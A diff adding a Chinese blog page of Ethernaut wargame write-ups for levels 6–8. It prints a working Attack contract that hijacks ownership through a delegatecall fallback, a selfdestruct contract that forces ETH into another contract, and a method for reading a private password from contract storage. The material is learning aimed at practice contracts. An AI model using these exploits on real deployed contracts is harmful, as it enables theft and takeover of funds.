@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/III.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第六关 12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut-刷题小记（四）">
+<meta property="og:url" content="https://eznp.github.io/2025/04/01/Ethernaut-%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/index.html">
+<meta property="og:site_name" content="Zer0">
+<meta property="og:description" content="第六关 12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202503311825560.png">
+<meta property="og:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202503312110516.png">
+<meta property="article:published_time" content="2025-04-01T12:38:25.000Z">
+<meta property="article:modified_time" content="2025-04-01T12:42:27.854Z">
+<meta property="article:author" content="Zer0">
+<meta property="article:tag" content="blockchain solidity">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202503311825560.png">
+  
+  
+  
+  <title>Ethernaut-刷题小记（四） - Zer0</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"eznp.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="Zer0" type="application/atom+xml">
+</head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/P.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ethernaut-刷题小记（四）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-01 20:38" pubdate>
+          2025年4月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Ethernaut-刷题小记（四）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>第六关</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br>contract Delegate <span class="hljs-punctuation">&#123;</span><br>    address public owner;<br><br>    constructor(address _owner) <span class="hljs-punctuation">&#123;</span><br>        owner = _owner;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    function pwn() public <span class="hljs-punctuation">&#123;</span><br>        owner = msg.sender;<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br>contract Delegation <span class="hljs-punctuation">&#123;</span><br>    address public owner;<br>    Delegate delegate;<br><br>    constructor(address _delegateAddress) <span class="hljs-punctuation">&#123;</span><br>        delegate = Delegate(_delegateAddress);<br>        owner = msg.sender;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    fallback() external <span class="hljs-punctuation">&#123;</span><br>        (bool result<span class="hljs-punctuation">,</span>) = address(delegate).delegatecall(msg.data);<br>        if (result) <span class="hljs-punctuation">&#123;</span><br>            this;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>该代码定义了两个合约，一个<code>Delegate</code>，一个<code>Delegation</code></p>
+<p>分析代码</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">contract Delegate <span class="hljs-punctuation">&#123;</span><br>    address public owner;<br><br>    constructor(address _owner) <span class="hljs-punctuation">&#123;</span><br>        owner = _owner;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    function pwn() public <span class="hljs-punctuation">&#123;</span><br>        owner = msg.sender;<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>owner</code>等于合约调用者</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json">contract Delegation <span class="hljs-punctuation">&#123;</span><br>    address public owner;<br>    Delegate delegate;<br><br>    constructor(address _delegateAddress) <span class="hljs-punctuation">&#123;</span><br>        delegate = Delegate(_delegateAddress);<br>        owner = msg.sender;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    fallback() external <span class="hljs-punctuation">&#123;</span><br>        (bool result<span class="hljs-punctuation">,</span>) = address(delegate).delegatecall(msg.data);<br>        if (result) <span class="hljs-punctuation">&#123;</span><br>            this;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个合约多了一个<code>fallback()</code>函数，<code>constructor</code>函数中多了一句<code>delegate = Delegate(_delegatAddress)</code>，<code>fallback</code>函数中调用了一个低级函数<code>delegatecall()</code></p>
+<p><code>fallback()</code>函数我们第一关就了解过了</p>
+<blockquote>
+<p><code>fallback</code>是一个特殊函数，在以下情况下执行：</p>
+<ul>
+<li>调用了不存在的函数，或者</li>
+<li>Ether 直接发送到合约但<code>receive()</code>不存在或<code>msg.data</code>不为空</li>
+</ul>
+</blockquote>
+<p>我们这一关的重点也就是<code>delegatecall()</code>这个函数，目标是获得“Delegation”合约的所有权</p>
+<blockquote>
+<p><code>delegatecall</code> 是 Solidity 提供的一个<strong>低级调用（Low-level Call）</strong>，允许一个合约在<strong>另一个合约的上下文中执行代码</strong>，但使用的是<strong>当前合约的存储</strong>。</p>
+<p><code>delegatecall</code> 的关键点：</p>
+<ol>
+<li><strong>目标合约的代码在调用者的上下文中执行</strong>（继承调用合约的存储布局）。</li>
+<li><strong><code>msg.sender</code> 不变</strong>，仍然是原始调用者。</li>
+<li><strong><code>msg.value</code> 不变</strong>，仍然是原始交易发送的金额。</li>
+<li><strong>如果存储变量的顺序不同，可能导致存储冲突和安全漏洞</strong>。</li>
+</ol>
+</blockquote>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solitidy">(bool success, bytes memory returnData) = targetContract.delegatecall(abi.encodeWithSignature(&quot;functionName(uint256)&quot;, 123));<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>targetContract</code> 是要调用的合约地址。</li>
+<li><code>abi.encodeWithSignature(&quot;functionName(uint256)&quot;, 123)</code> 是要调用的函数签名及参数。</li>
+<li><code>delegatecall</code> 返回两个值：<ul>
+<li><code>success</code>：<code>true</code> 表示调用成功，<code>false</code> 表示失败。</li>
+<li><code>returnData</code>：被调用函数返回的数据。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>攻击代码如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br>contract Delegate <span class="hljs-punctuation">&#123;</span><br>    address public owner;<br><br>    constructor(address _owner) <span class="hljs-punctuation">&#123;</span><br>        owner = _owner;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    function pwn() public <span class="hljs-punctuation">&#123;</span><br>        owner = msg.sender;<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br>contract Delegation <span class="hljs-punctuation">&#123;</span><br>    address public owner;<br>    Delegate delegate;<br><br>    constructor(address _delegateAddress) <span class="hljs-punctuation">&#123;</span><br>        delegate = Delegate(_delegateAddress);<br>        owner = msg.sender;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    fallback() external <span class="hljs-punctuation">&#123;</span><br>        (bool result<span class="hljs-punctuation">,</span>) = address(delegate).delegatecall(msg.data);<br>		<span class="hljs-comment">//delegatecall 执行 Delegate 的代码，但修改 Delegation 的存储。</span><br>		<span class="hljs-comment">//fallback() 代理执行 delegatecall，导致存储被劫持。</span><br>        if (result) <span class="hljs-punctuation">&#123;</span><br>            this;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br>contract Attack <span class="hljs-punctuation">&#123;</span><br>    address delegationContract;<br><br>    constructor(address _delegationContract) <span class="hljs-punctuation">&#123;</span><br>        delegationContract = _delegationContract;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    function attack() public <span class="hljs-punctuation">&#123;</span><br>        (bool success<span class="hljs-punctuation">,</span> ) = delegationContract.call(abi.encodeWithSignature(<span class="hljs-string">&quot;pwn()&quot;</span>));<br>        <span class="hljs-comment">//delegationContract.call(...) 手动构造交易，调用 Delegation 合约。</span><br>		<span class="hljs-comment">//abi.encodeWithSignature(&quot;pwn()&quot;) 构造 pwn()函数的调用数据。</span><br>		<span class="hljs-comment">//fallback函数的调用有两种情况，上面已经给出，这里由于Delegation没有pwn函数，fallback（）会触发</span><br>        require(success<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Attack failed&quot;</span>);<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202503311825560.png" srcset="/img/loading.gif" lazyload alt="image-20250331182553248"></p>
+<p>成功更改owner</p>
+<p>然后是第七关</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br>contract Force <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">/*</span><br><span class="hljs-comment">                   MEOW ?</span><br><span class="hljs-comment">         /\_/\   /</span><br><span class="hljs-comment">    ____/ o o \</span><br><span class="hljs-comment">    /~____  =ø= /</span><br><span class="hljs-comment">    (______)__m_m)</span><br><span class="hljs-comment">                   */</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>呃呃呃，一个空合约。。。<br>提示是 1、Fallback 方法 2、有时候攻击一个合约最好的方法是使用另一个合约</p>
+<p>fallback()函数调用情况上面已经说过</p>
+<p>emmm，我们得了解一下所有合约可以接受ETH的可能方式</p>
+<p>在以太坊（Ethereum）智能合约中，能够接收 ETH 的方式主要有以下几种：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>触发条件</th>
+<th>需要 <code>payable</code></th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>receive()</code></td>
+<td>仅接受 <strong>无数据</strong> 的 ETH 交易</td>
+<td>✅</td>
+<td><strong>推荐</strong>，更清晰</td>
+</tr>
+<tr>
+<td><code>fallback()</code></td>
+<td><strong>带数据</strong> 的 ETH 交易或无 <code>receive()</code> 时</td>
+<td>✅</td>
+<td>可用作后备方案</td>
+</tr>
+<tr>
+<td><code>selfdestruct()</code></td>
+<td>另一个合约 <code>selfdestruct(this)</code></td>
+<td>❌</td>
+<td><strong>强制</strong> 发送 ETH，无需 <code>payable</code></td>
+</tr>
+<tr>
+<td><code>delegatecall</code></td>
+<td>目标合约可接收 ETH</td>
+<td>✅</td>
+<td>间接接收 ETH</td>
+</tr>
+<tr>
+<td><code>block.coinbase</code></td>
+<td>矿工奖励</td>
+<td>❌</td>
+<td>特殊情况</td>
+</tr>
+</tbody></table>
+<p>其中的<code>selfdestruct()</code>很特殊，它不需要payable、receive、fallback，可以直接强制转账</p>
+<blockquote>
+<p><code>selfdestruct</code>的EVM操作码是做什么的？从Solidity 文档关于<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct">停用和自毁</a>的部分，你将了解到：</p>
+<ol>
+<li>这是从区块链上删除合约代码的唯一方法。</li>
+<li>储存在合约地址的剩余以太币被发送给指定的目标接收者</li>
+<li>存储和代码（在发送以太币后）会从状态中删除</li>
+</ol>
+<p>有两个重要的注意事项也要记住：</p>
+<ol>
+<li><em>即使一个合约被</em> <code>selfdestruct</code><em>删除，它仍然是区块链历史的一部分，可能被大多数以太坊节点保留。因此，使用</em> <code>selfdestruct</code>与从硬盘上删除数据不同。</li>
+<li><em>即使合约的代码不包含对</em> <code>selfdestruct</code><em>的调用，它仍然可以使用</em> <code>delegatecall</code> <em>或</em> <code>callcode</code>执行该操作。</li>
+</ol>
+</blockquote>
+<p>那么我们的目标就很明确了</p>
+<p>使用<code>selfdestruct（）</code>函数来强制向合约发送以太币，那么这关也就迎刃而解了</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.0</span>;<br><br>contract Force &#123;&#125;<br><br>contract Sender &#123;<br>    function <span class="hljs-built_in">destroyAndSend</span>(address payable recipient) external payable &#123;<br>        <span class="hljs-built_in">selfdestruct</span>(recipient);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202503312110516.png" srcset="/img/loading.gif" lazyload alt="image-20250331211044591"></p>
+<p>成功转账</p>
+<p>然后是第八关</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br>contract Vault <span class="hljs-punctuation">&#123;</span><br>    bool public locked;<br>    bytes32 private password;<br><br>    constructor(bytes32 _password) <span class="hljs-punctuation">&#123;</span><br>        locked = <span class="hljs-literal"><span class="hljs-keyword">true</span></span>;<br>        password = _password;<br>    <span class="hljs-punctuation">&#125;</span><br><br>    function unlock(bytes32 _password) public <span class="hljs-punctuation">&#123;</span><br>        if (password == _password) <span class="hljs-punctuation">&#123;</span><br>            locked = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>描述：打开 vault 来通过这一关!</p>
+<p>要是想打开，那就是得知道password这个私密变量，那么我们怎么去知道呢</p>
+<p>要解决这个问题，只要知道Solidity的存储区域的结构就很容易了。</p>
+<p>Solidity一共有四个存储区域。</p>
+<ul>
+<li>贮存</li>
+<li>记忆</li>
+<li>呼叫数据</li>
+<li>堆</li>
+</ul>
+<p>其中，变量和函数在被永久保存的同时，保存的区域又在哪里呢？它的意思是存储。</p>
+<p>在Storage中，值和变量存储在一起，因此即使是私有的，也可以被访问。这是因为，虽然变量不能从外部直接访问，但是通过访问存储空间中的值就可以进行访问。</p>
+<p>所以使用getStorageAt(address _address, uint256 _index)函数，index&#x3D;1就可以看到</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/blockchain-solidity/" class="print-no-link">#blockchain solidity</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ethernaut-刷题小记（四）</div>
+      <div>https://eznp.github.io/2025/04/01/Ethernaut-刷题小记（四）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/20/Ethernaut-%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/" title="Ethernaut-刷题小记（三）">
+                        <span class="hidden-mobile">Ethernaut-刷题小记（三）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
